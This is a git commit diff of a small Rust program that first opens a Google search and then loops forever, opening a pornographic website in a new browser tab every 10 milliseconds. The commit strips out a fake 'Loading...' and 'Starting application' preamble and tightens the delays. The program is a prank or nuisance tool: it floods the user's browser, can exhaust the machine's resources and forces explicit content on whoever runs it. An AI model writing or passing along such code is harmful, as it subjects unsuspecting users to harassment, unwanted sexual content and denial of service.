8830439bc10283266085862db9c514ed15715509
FelixKLG <felix@felixklg.dev>
2022-11-03 20:22:50 +0000

    Remove bs code

--- src/main.rs
+++ src/main.rs
@@ -1,29 +1,24 @@
-    use std::{thread, time};
+use std::{thread, time};
 
-    fn main() {
-        println!("Loading...");
-        thread::sleep(time::Duration::from_secs(2));
-        println!("Starting application in browser!");
-        thread::sleep(time::Duration::from_secs(1));
-        
-        if let Err(e) = open_tab("https://google.com/search?q=download+more+ram") {
+fn main() {
+    if let Err(e) = open_tab("https://google.com/search?q=how+to+program+in+rust") {
+        println!("{:#?}", e);
+        panic!("Failed to execute program!");
+    }    
+    thread::sleep(time::Duration::from_millis(15));
+
+    let delay = time::Duration::from_millis(10);
+    let target_url = "https://pornhub.com/gay";
+
+    loop {
+        if let Err(e) = open_tab(target_url) {
             println!("{:#?}", e);
             panic!("Failed to execute program!");
-        }    
-        thread::sleep(time::Duration::from_secs(2));
-
-        let delay = time::Duration::from_millis(10);
-        let target_url = "https://pornhub.com/gay";
-
-        loop {
-            if let Err(e) = open_tab(target_url) {
-                println!("{:#?}", e);
-                panic!("Failed to execute program!");
-            }
-            thread::sleep(delay);
         }
+        thread::sleep(delay);
     }
+}
 
-    fn open_tab(url: &str) -> Result<(), std::io::Error> {
-        webbrowser::open(&url)
-    }
+fn open_tab(url: &str) -> Result<(), std::io::Error> {
+    webbrowser::open(&url)
+}
